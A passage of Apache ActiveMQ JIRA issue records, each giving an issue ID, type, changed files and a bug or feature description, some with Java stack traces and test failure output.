sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:597) at junit.framework.TestCase.runTest(TestCase.java:176) at junit.framework.TestCase.runBare(TestCase.java:141) at junit.framework.TestResult$1.protect(TestResult.java:122) at junit.framework.TestResult.runProtected(TestResult.java:142) at junit.framework.TestResult.run(TestResult.java:125) at junit.framework.TestCase.run(TestCase.java:129) at junit.framework.TestSuite.runTest(TestSuite.java:255) at junit.framework.TestSuite.run(TestSuite.java:250) at org.junit.internal.runners.JUnit38ClassRunner.run(JUnit38ClassRunner.java:84) at org.apache.maven.surefire.junit4.JUnit4TestSet.execute(JUnit4TestSet.java:53) at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:123) at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:104) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:597) at org.apache.maven.surefire.util.ReflectionUtils.invokeMethodWithArray(ReflectionUtils.java:164) at org.apache.maven.surefire.booter.ProviderFactory$ProviderProxy.invoke(ProviderFactory.java:110) at org.apache.maven.surefire.booter.SurefireStarter.invokeProvider(SurefireStarter.java:175) at org.apache.maven.surefire.booter.SurefireStarter.runSuitesInProcessWhenForked(SurefireStarter.java:81) at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:68)Caused by: java.io.IOException: Database &apos;target/derbydb_15&apos; not found. at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:45) at org.apache.activemq.store.jdbc.TransactionContext.getConnection(TransactionContext.java:68) at org.apache.activemq.store.jdbc.adapter.DefaultJDBCAdapter.doAddMessage(DefaultJDBCAdapter.java:218) at org.apache.activemq.store.jdbc.JDBCMessageStore.addMessage(JDBCMessageStore.java:123) at org.apache.activemq.store.memory.MemoryTransactionStore.addMessage(MemoryTransactionStore.java:327) at org.apache.activemq.store.memory.MemoryTransactionStore$2.asyncAddTopicMessage(MemoryTransactionStore.java:190) at org.apache.activemq.broker.region.Topic.doMessageSend(Topic.java:482) at org.apache.activemq.broker.region.Topic.send(Topic.java:446) at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:406) at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:431) at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:147) at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96) at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:317) at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:152) at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:464) at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:751) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:294) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:149) at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:288) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196) at java.lang.Thread.run(Thread.java:680)Caused by: java.sql.SQLException: Database &apos;target/derbydb_15&apos; not found. at org.apache.derby.impl.jdbc.SQLExceptionFactory40.getSQLException(Unknown Source) at org.apache.derby.impl.jdbc.Util.newEmbedSQLException(Unknown Source) at org.apache.derby.impl.jdbc.Util.newEmbedSQLException(Unknown Source) at org.apache.derby.impl.jdbc.Util.generateCsSQLException(Unknown Source) at org.apache.derby.impl.jdbc.EmbedConnection.newSQLException(Unknown Source) at org.apache.derby.impl.jdbc.EmbedConnection.handleDBNotFound(Unknown Source) at org.apache.derby.impl.jdbc.EmbedConnection.&lt;init&gt;(Unknown Source) at org.apache.derby.impl.jdbc.EmbedConnection30.&lt;init&gt;(Unknown Source) at org.apache.derby.impl.jdbc.EmbedConnection40.&lt;init&gt;(Unknown Source) at org.apache.derby.jdbc.Driver40.getNewEmbedConnection(Unknown Source) at org.apache.derby.jdbc.InternalDriver.connect(Unknown Source) at org.apache.derby.jdbc.EmbeddedDataSource.getConnection(Unknown Source) at org.apache.derby.jdbc.EmbeddedDataSource.getConnection(Unknown Source) at org.apache.activemq.store.jdbc.StopDBDuringProducerSendTopicTest$ReconnectingEmbeddedDataSource.getConnection(StopDBDuringProducerSendTopicTest.java:242) at org.apache.activemq.store.jdbc.TransactionContext.getConnection(TransactionContext.java:58) ... 23 moreCaused by: java.lang.Throwable: org.apache.derby.impl.jdbc.EmbedSQLException: Database &apos;target/derbydb_15&apos; not found. at org.apache.derby.impl.jdbc.SQLExceptionFactory.getSQLException(Unknown Source) at org.apache.derby.impl.jdbc.SQLExceptionFactory40.wrapArgsForTransportAcrossDRDA(Unknown Source) ... 38 more
issueID:AMQ-4645
type:Bug
changed files:
texts:The lease-database-locker does not work properly if slave broker system clock is behind Database server
The lease locker can adjust the lease duration based on the DB current time but this only works if the broker is ahead of the Db.If the broker is behind, it will always obtain a lease due to incorrect adjustment.If the clocks are in sync there is no issue.<persistenceAdapter>        <jdbcPersistenceAdapter dataSource="#oracle-ds" lockKeepAlivePeriod="5000">            <locker>                <lease-database-locker lockAcquireSleepInterval="10000"/>            </locker>        </jdbcPersistenceAdapter>    </persistenceAdapter>The problem is that the negative diff is being treated as a positive diff.
issueID:AMQ-4648
type:Bug
changed files:CreateCommand.java
texts:fix script created by ./bin/activemq create to be able to pass command line args and run in the background
after creating a broker with ./bin/activemq create <path>and running that broker with additional command lines eg:./bin/newbroker start -Dproperty=valuethe args are passed to the parent script in such a way to cause the broker to run in the foreground.
issueID:AMQ-4651
type:Bug
changed files:
texts:Messages consumed in a TX from AMQP client are not removed from the Queue
Consumers using the QPid JMS client reading from a Queue in a TX aren"t removing consumed messages from the Queue.
issueID:AMQ-4655
type:Bug
changed files:
texts:We should run JoramJmsTests with amqp+ssl
We should run the JoramJmsTests using amqp+ssl.I will attach a patch.
issueID:AMQ-4656
type:Bug
changed files:
texts:Pending Queue Counter is incorrect when using durable topics
When using a durable topics the Pending Queue Counter provides an incorrect value for pending messages.Steps to recreateSet up the durable subscriberant consumer -Durl=tcp://localhost:61616 -Dtopic=true -Dsubject=MYSUB -Ddurable=true -Dmax=2Stop the subscriberSend 20 persistent messagesant producer -Ddurable=true -Durl=tcp://localhost:61616 -Dtopic=true -Dsubject=MYSUB -Dmax=20Consume 2 messagesant consumer -Durl=tcp://localhost:61616 -Dtopic=true -Dsubject=MYSUB -Ddurable=true -Dmax=2View the counter stats.The result is the following:Pending Queue Size = 38Dispatched Queue Size = 0Dispatched Counter = 20Enqueue Counter = 20Dequeue Counter = 2
issueID:AMQ-4662
type:Improvement
changed files:
texts:KahaDB default checksumJournalFiles to true
A checksum allows us to validate and ignore missing/corrupt journal files (both of which are optional). It is too late to enable checksumJournalFiles after the fact of corruption. Best to have it on by default and take the small performance penalty so that in the rare event of corruption we have some options. Folks who don"t care about the integrity of the journal can disable it.
issueID:AMQ-4665
type:Bug
changed files:
texts:Failover with client ack mode consumer can loose a message auto acked as a duplicate
with a client ack consumer and failover after receipt but before message.ack can result in a missed message when the message is redispatched and auto acked as a duplicate.Failover interrupt should clear dispatched and unconsumed messages so that they can get redelivered.auto-acking a duplicate seems over eager. think best to poison pill and now that we can include a cause property it will be possible to differentiate.
issueID:AMQ-4668
type:Improvement
changed files:MessageServletSupport.java
texts:REST API only accepts non-form content if content type of text/xml
If you don"t format the POST content like "body={content}", the servlet will only read the body if the content type is text/xml. I"d like to submit JSON so it is not working. I"ve included a patch to open it up a bit.
issueID:AMQ-467
type:New Feature
changed files:ActiveMQResourceAdapter.java
ActiveMQConnectionRequestInfo.java
ActiveMQManagedConnectionFactory.java
texts:allow customisation of the redelivery policy and prefetch policy on the ActiveMQ ResourceAdapter and ActiveMQManagedConnectionFactory
None
issueID:AMQ-4670
type:Bug
changed files:
texts:DurableSubDelayedUnsubscribeTest.testProcess fails intermittently
This test fails intermittently as shown below. This occurs because the test assumes all clients have finished, where under certain circumstances there could still be one active client that is sleeping.java.lang.AssertionError: should have only one inactiveSubscriber subscribed expected:<1> but was:<2> at org.junit.Assert.fail(Assert.java:88) at org.junit.Assert.failNotEquals(Assert.java:743) at org.junit.Assert.assertEquals(Assert.java:118) at org.junit.Assert.assertEquals(Assert.java:555) at org.apache.activemq.usecases.DurableSubDelayedUnsubscribeTest.testProcess(DurableSubDelayedUnsubscribeTest.java:131) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:597) at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:47) at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12) at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:44) at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17) at org.junit.internal.runners.statements.RunBefores.evaluate(RunBefores.java:26) at org.junit.internal.runners.statements.RunAfters.evaluate(RunAfters.java:27) at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:271) at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:70) at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:50) at org.junit.runners.ParentRunner$3.run(ParentRunner.java:238) at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:63) at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:236) at org.junit.runners.ParentRunner.access$000(ParentRunner.java:53) at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:229) at org.junit.runners.ParentRunner.run(ParentRunner.java:309) at org.apache.maven.surefire.junit4.JUnit4TestSet.execute(JUnit4TestSet.java:53) at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:123) at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:104) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:597) at org.apache.maven.surefire.util.ReflectionUtils.invokeMethodWithArray(ReflectionUtils.java:164) at org.apache.maven.surefire.booter.ProviderFactory$ProviderProxy.invoke(ProviderFactory.java:110) at org.apache.maven.surefire.booter.SurefireStarter.invokeProvider(SurefireStarter.java:175) at org.apache.maven.surefire.booter.SurefireStarter.runSuitesInProcessWhenForked(SurefireStarter.java:81) at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:68)
issueID:AMQ-4671
type:Bug
changed files:
texts:REGRESSION: InvalidDestinationException should be thrown on Session.unsubscribe that has no sub
When calling unsubscribe on Session with invalid subscription as a parameter InvalidDestinationException should be thrown. AMQ-4000 fix broke this.
issueID:AMQ-4672
type:Bug
changed files:SslTransport.java
texts:[JMS Client] Set the SNI field on SSL connections
None
issueID:AMQ-4674
type:Bug
changed files:StompTransportFilter.java
ProtocolConverter.java
texts:ActiveMQ 5.x does not support the notion of a grace-period for heart beats as supported by the STOMP protocol
Regarding the configuration of heart beating the STOMP protocol spec states:    "- because of timing inaccuracies, the receiver SHOULD be tolerant and take into account an error margin"However, it appears that ActiveMQ 5.x is not tolerant of any error margin. Despite the fact that the spec says SHOULD rather than MUST it would make the implementation of STOMP clients easier if the error margin was published.As the broker aggressively enforces the heart beat timeouts false failover attempts can result.Apparently Apollo supports an error margin of 1.5x the configured heart beat. If it could be made configurable that would be even better!
issueID:AMQ-4675
type:Improvement
changed files:MessageServlet.java
texts:Rest MessageServlet should set cache control header
Internet Explorer 10 caches the response for rest api calls
issueID:AMQ-4676
type:Bug
changed files:ActiveMQXAConnectionFactory.java
LoggingBrokerPlugin.java
ResourceLoadingSslContext.java
PooledConnectionFactoryBean.java
XBeanAuthorizationMap.java
BrokerService.java
CamelEndpointLoader.java
SpringSslContext.java
XBeanAuthorizationEntry.java
ActiveMQConnectionFactory.java
XBeanBrokerService.java
texts:ActiveMQ not compliant with JSR-250 (@PostConstruct, @PreDestroy)
ActiveMQ is not compliant with JSR-250, which states:2.5 javax.annotation.PostConstruct: &#91;...&#93; The method MUST NOT throw a checked exception. If the method throws an unchecked exception the class MUST NOT be put intoservice. In the case of EJBs the method annotated with PostConstruct canhandle exceptions and cleanup before the bean instance is discarded.2.6 javax.annotation.PreDestroy(same as above)An exception was thrown when attempting to deploy an application using the activemq-rar-5.8 on GF 4.0, but I believe it"s safe to say that this can occur in different containers - if not now, potentially between container releases.  Included are patches that fix this in all ActiveMQ components.  Most check exceptions thrown were Exception, which was changed to RuntimeException (trapped and wrapped).  There were also IOExceptions being thrown, in which case ActiveMQ-broker now has an IORuntimeException class that is thrown.  Any downstream catches that handled the check exceptions have been converted to catch the RuntimeExceptions.This was also reported under AMQ-4673, but the scope of that issue was a lot more limited.
issueID:AMQ-4677
type:Bug
changed files:
texts:LevelDB can&#39;t move all message data logs that are no longer used
Producers and consumers of a single thread to send and consume 50,000 messages, each message size is 600K, capacity of 28G or so;Problem: after the message is sent and consumption, there are 7G about the file is not clear.By the way, kahaDB have an attribute "cleanupInterval", Why levelDB without this?
issueID:AMQ-4678
type:Bug
changed files:
texts:Timeout for StompLoadTest.testStompUnloadLoad is too long
The timeout for this test is currently set to 20*60*1000*1000.  If I"m doing the math correctly that"s 20,000 minutes.  This occasionally leads to build hangs.This test (and the 3 that extend it) generally takes 70-85 seconds on my Mac, so a 5 minute timeout should be plenty.
issueID:AMQ-4682
type:New Feature
changed files:
texts:runtime configuration - allow selective application of changes to xml configuration without broker restart
support on the fly configuration changes where appropriate.Via JMX it is possible to make changes but they don"t persist.Via osgi we can restart the broker to pick up changes to xml configbut where it makes sense, we should be able to apply changes on the fly.A first example would be the addition on a new network connector bythe addition of the relevant xml config (edit or copy over) that isin use by the broker.
issueID:AMQ-4683
type:Bug
changed files:
texts:Scheduler discards overdue messages on startup
When message is scheduled for a delivery (using AMQ_SCHEDULED_PERIOD property) it is not posted to the queue, but saved to the scheduler’s repository instead. If Broker instance is shut down at the time for which the message is scheduled for a delivery, the scheduler will try to process the message at the next time broker is started up. Due to a bug in the scheduler implementation such messages may be dismissed rather than posted to the queue depending on the racing conditions inside the JVM.Actual bug resides in org.apache.activemq.broker.scheduler.SchedulerBroker.getInternalScheduler() method. This method first calls JobSchedulerStoreImpl. getJobScheduler(String name) method which in turn creates an instance of runnable JobSchedulerImpl class and starts it.Then SchedulerBroker registers itselfas a listener of the newly created JobSchedulerImpl.Unfortunately this may happen after the JobSchedulerImpl have dismissed all the “missed” tasks as “fired” as there were no listeners configured.
issueID:AMQ-4685
type:Bug
changed files:
texts:LDAPLoginModule throws InvalidNameException when resolving LDAP aliases
Some LDAP servers allow you to define aliases for objects. For example, consider the following LDAP directory layout:dc=example,dc=com   ou=ActiveMQ      ou=Users      ou=Roles      ou=Destinations   ou=PeopleIn this layout, accounts specific to ActiveMQ go under ou=Users,ou=ActiveMQ. However, some accounts in ou=People should also be able to have access to the ActiveMQ server. To avoid duplicating accounts, you can have the regular account (objectClass=inetOrgPerson) in ou=People and create an LDAP alias (objectClass=alias) for it in ou=People. The LDAP server then takes care about the alias resolution.The JNDI LDAP client supports LDAP alias dereferencing as well. However, the search results for resolved aliases are different. For regular entries, SearchResult.getName() returns a relative DN and SearchResult.isRelative() returns true; for dereferenced aliases, SearchResult.getName() returns a full LDAP URI with the DN of the alias target (for example, "ldap://localhost:389/uid=bob,ou=People,dc=example,dc=com") and SearchResult.isRelative() returns false (as documented, for example, in &#91;1&#93;).The code in o.a.a.jaas.LDAPLoginModule does not make this distinction. It assumes that all returned names are RDNs and passes them to NameParser.parse() which in turn raises a NamingException because an LDAP URI is obviously not an LDAP (R)DN.The attached patch resolved the problem at least for my configuration. If isRelative() returns false, the name is parsed as an URI. Per definition of LDAP URIs, the path component is the distinguished name, which is then taken.Of course, this does not take care of multiple layers of aliases, aliases for containers and so on - I just found it over the course of setting up LDAP  authentication in my system, which happens only to alias user accounts. It works for me with the patch and seems not to make things worse  If needed, maybe I can do some further tests and/or correct the patch.&#91;1&#93; http://docs.oracle.com/javase/jndi/tutorial/ldap/misc/aliases.html
issueID:AMQ-4686
type:Bug
changed files:
texts:Message browsing denied for stomp protocol 1.2
Hello.Connected to the broker and successfully negotiated 1.2 as the protocol version with the CONNECT frames. When sending the header browser:true within a SUBSCRIBE frame the broker logs the exception "org.apache.activemq.transport.stomp.ProtocolException: Queue Browser feature only valid for Stomp v1.1 clients!".Checking file https://svn.apache.org/repos/asf/activemq/trunk/activemq-stomp/src/main/java/org/apache/activemq/transport/stomp/ProtocolConverter.java , line 557, the exception is thrown if the protocol is not 1.1 only, not 1.1 or above. Confirmed on the user list this seems to be a bug: http://activemq.2283324.n4.nabble.com/Message-browsing-with-Stomp-client-1-2-td4670514.htmlRegards.
issueID:AMQ-4689
type:Improvement
changed files:BrokerService.java
texts:Allow for JobSchedulerStore implementations to be provided by the PersistenceAdapter
We currently create a JobSchedulerStore by looking for the KahaDB implementation which means another store can"t implement one itself and provide that instead of always needing the KahaDB implementation always. We can use the PListStore approach and check if the PersistenceAdapter implements JobSchedulerStore before we jump into the KahaDB lookup code.  It would be nice if the details of directory etc could be removed from BrokerService and be configured via the persistence adapter but for now we probably don"t want to break backwards configuration compat.
issueID:AMQ-4690
type:New Feature
changed files:
texts:create a camel component for intercepting messages as they pass through the Broker
None
issueID:AMQ-4695
type:Bug
changed files:
texts:Cannot connect as Anonymous over MQTT TransportConnector
When configuring for authn/authz and allowing anonymous access, connections made on the MQTT connector cannot connect via anonymous user. See an example config here:http://pastebin.com/91f029Aa
issueID:AMQ-4696
type:Bug
changed files:
texts:Durable Subscriptions are not created properly when using AMQP
I can add a more detail description if needed but for now to reproduce this you"ll need to comment out testUnsubscribe in the JoramJmsTest TopicSessionTest, build a snapshot, uncomment TopicSessionTest in JoramJmsTest and run that.  The testDurableSubscriber will fail.I have a patch for this, I can post it now or after the patch for AMQ-4596 is posted
issueID:AMQ-4697
type:New Feature
changed files:DestinationViewMBean.java
BrokerView.java
BrokerViewMBean.java
StatisticsBroker.java
BrokerDestinationView.java
Topic.java
Queue.java
DestinationStatistics.java
DestinationView.java
texts:Add the ability to show average message size per destination
Add message size statistic to a destination
issueID:AMQ-470
type:Improvement
changed files:Main.java
ManagementContext.java
texts:Make the default jmx URL be  service:jmx:rmi:///jndi/rmi://localhost:1099/jmxrmi
None
issueID:AMQ-4702
type:Bug
changed files:
texts:Error resolving org.jvnet.jaxb2_commons packages
Getting the following on trunk when trying to install activemq-osgi:Error when installing feature activemq: java.lang.Exception: Can not resolve feature:Unsatisfied requirement(s):---------------------------package&(package=org.jvnet.jaxb2_commons.lang)(version>=0.6.0)(!(version>=1.0.0)))activemq-osgipackage&(package=org.jvnet.jaxb2_commons.locator)(version>=0.6.0)(!(version>=1.0.0)))activemq-osgipackage&(package=org.jvnet.jaxb2_commons.locator.util)(version>=0.6.0)(!(version>=1.0.0)))activemq-osgi
issueID:AMQ-4704
type:Bug
changed files:
texts:Stomp unit tests fail
Failed tests:   testSendMessageWithDelay(org.apache.activemq.transport.stomp.StompNIOSSLTest)  testTempDestination(org.apache.activemq.transport.stomp.StompNIOSSLTest): expected:<&#91;Hello World&#93;> but was:<[java.lang.SecurityException: User system is not authorized to read from: temp-queue://ID:vostro-41790-1377853697900-4:46:1  testReplyToAcrossConnections(org.apache.activemq.transport.stomp.StompNIOSSLTest): Receipt Frame: ERROR  testReplyToDestinationNaming(org.apache.activemq.transport.stomp.StompNIOSSLTest)  testSendMessageWithDelay(org.apache.activemq.transport.stomp.StompNIOTest)  testTempDestination(org.apache.activemq.transport.stomp.StompNIOTest): expected:<&#91;Hello World&#93;> but was:<[java.lang.SecurityException: User system is not authorized to read from: temp-queue://ID:vostro-58773-1377854133134-4:46:1  testReplyToAcrossConnections(org.apache.activemq.transport.stomp.StompNIOTest): Receipt Frame: ERROR  testReplyToDestinationNaming(org.apache.activemq.transport.stomp.StompNIOTest)  testSendMessageWithDelay(org.apache.activemq.transport.stomp.StompSslAuthTest)  testTempDestination(org.apache.activemq.transport.stomp.StompSslAuthTest): expected:<&#91;Hello World&#93;> but was:<[java.lang.SecurityException: User CN=localhost, OU=activemq.org, O=activemq.org, L=LA, ST=CA, C=US is not authorized to read from: temp-queue://ID:vostro-35025-1377854435243-2:46:1  testReplyToAcrossConnections(org.apache.activemq.transport.stomp.StompSslAuthTest): Receipt Frame: ERROR  testReplyToDestinationNaming(org.apache.activemq.transport.stomp.StompSslAuthTest)  testSendMessageWithDelay(org.apache.activemq.transport.stomp.StompSslTest)  testTempDestination(org.apache.activemq.transport.stomp.StompSslTest): expected:<&#91;Hello World&#93;> but was:<[java.lang.SecurityException: User system is not authorized to read from: temp-queue://ID:vostro-34293-1377854833774-4:46:1  testReplyToAcrossConnections(org.apache.activemq.transport.stomp.StompSslTest): Receipt Frame: ERROR  testReplyToDestinationNaming(org.apache.activemq.transport.stomp.StompSslTest)  testSendMessageWithDelay(org.apache.activemq.transport.stomp.StompTest)  testTempDestination(org.apache.activemq.transport.stomp.StompTest): expected:<&#91;Hello World&#93;> but was:<[java.lang.SecurityException: User system is not authorized to read from: temp-queue://ID:vostro-40068-1377855151851-4:46:1  testReplyToAcrossConnections(org.apache.activemq.transport.stomp.StompTest): Receipt Frame: ERROR  testReplyToDestinationNaming(org.apache.activemq.transport.stomp.StompTest)Tests run: 519, Failures: 20, Errors: 0, Skipped: 0
issueID:AMQ-4705
type:Bug
changed files:SharedFileLocker.java
texts:Add keep alive support to shared file locker
issue on nsfv4 with a master slave configuration, where both the slave and the master could obtain a lock.The following events occurred: master locks the file - does no more i/o to it – it"s passive wrt the lock slave asks every 10 seconds if it can get the lock nfs come back and say no, someone has it nfs dies not nicely   nfsv4 is stateful - no callback for locks.  It has a grace period of 30 seconds to let all clients that had locks reclaim them as locked   master does not realize it needs to reclaim the lock and continues under the assumption it has the lock. After 30 sec grace period, slave comes in and asks for the lock and it receives it.
issueID:AMQ-4706
type:Improvement
changed files:FailoverTransport.java
texts:Failover transport - Add option to configure WARN logging internval for failover attempts still failing
The failover transporthttp://activemq.apache.org/failover-transport-reference.htmlIf a client is constantly trying to failover and re-connect but can"t do this for a long time, then it would be nice if there was a WARN log once in a while to indicate that.So if there is a new option people can turn on to log that, or have a sensible default so its out of the boxFor examplereconnectWarnLogInterval=30000Which then logs every 30 sec if failover/reconnect is still failing. People can then turn that off with 0, -1 or set a higher value if 30 sec is too frequent.See alsohttp://camel.465427.n5.nabble.com/bundle-stays-in-state-creating-tp5738312.htmlFor people using ServiceMix it may cause their bundles to keep in grace mode, and they cant understand why. So if there is at least some WARN log activity then they would understand better.
issueID:AMQ-4709
type:Improvement
changed files:
texts:Allow wildcards in Authorization plugin group definitions
According to http://activemq.apache.org/security.html, "full access rights should always be given to the ActiveMQ.Advisory destinations". In a broker with many users and groups this is not easy to accomplish with tens of groups.As such, we should provide some feature to allow wildcards, e.g:read="*" that will match any group.
issueID:AMQ-4711
type:Bug
changed files:
texts:totalMessageCount stat is not properly updated when destination is removed
When we remove a destination using JMX the appropriate parent statistics object is not properly updated, leading to wrong message count statistics.
issueID:AMQ-4712
type:Bug
changed files:
texts:MQTT unit tests fail
Running org.apache.activemq.transport.mqtt.MQTTNioTestTests run: 19, Failures: 0, Errors: 2, Skipped: 0, Time elapsed: 160.808 sec <<< FAILURE!Running org.apache.activemq.transport.mqtt.MQTTSSLTestTests run: 18, Failures: 0, Errors: 1, Skipped: 0, Time elapsed: 161.426 sec <<< FAILURE!Running org.apache.activemq.transport.mqtt.MQTTTestTests run: 18, Failures: 0, Errors: 1, Skipped: 0, Time elapsed: 158.184 sec <<< FAILURE!Results :Tests in error:  testPingOnMQTTNIO(org.apache.activemq.transport.mqtt.MQTTNioTest): The client id MUST be configured when clean session is set to false  testReceiveMessageSentWhileOffline(org.apache.activemq.transport.mqtt.MQTTNioTest): String index out of range: -6  testReceiveMessageSentWhileOffline(org.apache.activemq.transport.mqtt.MQTTSSLTest): Command from server contained an invalid message id: 1  testReceiveMessageSentWhileOffline(org.apache.activemq.transport.mqtt.MQTTTest): Command from server contained an invalid message id: 1Tests run: 55, Failures: 0, Errors: 4, Skipped: 0
issueID:AMQ-4713
type:Bug
changed files:AmqpProtocolConverter.java
texts:org.apache.activemq.transport.amqp.JMSClientTest.testTXConsumerAndLargeNumberOfMessages fails
This fails intermittently with one of the two errors shown below:Running org.apache.activemq.transport.amqp.JMSClientTestTests run: 5, Failures: 1, Errors: 0, Skipped: 0, Time elapsed: 13.778 sec <<< FAILURE!testTXConsumerAndLargeNumberOfMessages(org.apache.activemq.transport.amqp.JMSClientTest)  Time elapsed: 2.027 sec  <<< FAILURE!java.lang.AssertionError: expected:<0> but was:<15> at org.junit.Assert.fail(Assert.java:88) at org.junit.Assert.failNotEquals(Assert.java:743) at org.junit.Assert.assertEquals(Assert.java:118) at org.junit.Assert.assertEquals(Assert.java:555) at org.junit.Assert.assertEquals(Assert.java:542) at org.apache.activemq.transport.amqp.JMSClientTest.testTXConsumerAndLargeNumberOfMessages(JMSClientTest.java:193)Results :Failed tests:   JMSClientTest.testTXConsumerAndLargeNumberOfMessages:193 expected:<0> but was:<15>Tests run: 5, Failures: 1, Errors: 0, Skipped: 0------------------------------------------------------- T E S T S-------------------------------------------------------Running org.apache.activemq.transport.amqp.JMSClientTestTests run: 5, Failures: 1, Errors: 0, Skipped: 0, Time elapsed: 40.032 sec <<< FAILURE!testTXConsumerAndLargeNumberOfMessages(org.apache.activemq.transport.amqp.JMSClientTest)  Time elapsed: 18.031 sec  <<< FAILURE!java.lang.AssertionError: Should receive message: 159 at org.junit.Assert.fail(Assert.java:88) at org.junit.Assert.assertTrue(Assert.java:41) at org.junit.Assert.assertNotNull(Assert.java:621) at org.apache.activemq.transport.amqp.JMSClientTest.testTXConsumerAndLargeNumberOfMessages(JMSClientTest.java:181)
issueID:AMQ-4714
type:Bug
changed files:
texts:If multiple MessageInterceptors are registered, a stack overflow can occur
None
issueID:AMQ-4717
type:Bug
changed files:
texts:populateJMSXUserID is not setting the JMSXUserID property on the JMS message in JMX
When setting the attribute populateJMSXUserID="true" as documented &#91;1&#93; the broker should populate the JMS message with the JMSXUserID property.  However, this is not the case.  I have configured the broker to require authentication and sent a message to a Queue using the JMS producer shipped with the distribution.  The message is then inspected via JMX and the JMSXUserID property is not set.&#91;1&#93; http://activemq.apache.org/jmsxuserid.html
issueID:AMQ-4718
type:New Feature
changed files:URISupport.java
FailoverTransportFactory.java
texts:Extra options added to a failover/discovery URL that don&#39;t map to failover configuration settings, should get passed to the nested URLs.
None
issueID:AMQ-4719
type:Bug
changed files:TransportServerFilter.java
TcpTransportServer.java
TransportServer.java
UdpTransportServer.java
texts:Enable "Link Stealing" as an option on a Connector
The JMS Spec states that connecting with a duplicate ClientID should throw an Exception. However, for MQTT and AMQP specs "Link Stealing" where the last ClientID pushes out the older connection with the same ClientID should be supported. ActiveMQ supports link stealing for connections with a duplicate ConnectionID - though the ConnectionID is not something supported by MQTT or AMQP. Make Link Stealing optional - so it can be set on by default for MQTT and AMQP TransportConnectors
issueID:AMQ-4721
type:Improvement
changed files:
texts:Update slf4j library to latest version (1.7.5 currently)
We are currently on an older release v1.6.6 and should move on to the latest v1.7.5 to pick up performance improvements etc.  From the changelog:"performance improvements: The logger factories in most SLF4J modules namely in jcl-over-slf4j, log4j-over-slf4j, slf4j-jcl, slf4j-jdk14, slf4j-log4j12, and slf4j-simple now use a ConcurrentHashMap instead of a regular HashMap to cache logger instances. This change significantly improves logger retrieval times at the cost of some memory overhead. This improvement was requested in bug #298 by Taras Tielkes who also provided the relevant patch. Given the significance of these performance improvements, users are highly encouraged to migrate to SLF4J version 1.7.5 or later. "
issueID:AMQ-4723
type:New Feature
changed files:HTTPDiscoveryAgent.java
DiscoveryTransport.java
Suspendable.java
texts:HTTP Discovery agent should only poll for broker URLs while attempting to connect a transport.
None
issueID:AMQ-4725
type:Bug
changed files:
texts:FailoverUriTest hangs
The TestBadVersionNumberDoesNotWork and TestBadPropertyNameFails both hang when the init method adds the following:      addCombinationValues("postfix", new Object[] {")?initialReconnectDelay=1000&maxReconnectDelay=1000"});I"ll attach a patch which comments these out so the build doesn"t hang, as well as a stack trace.
issueID:AMQ-4726
type:Bug
changed files:
texts:Text information of ant producer durable option is not correct
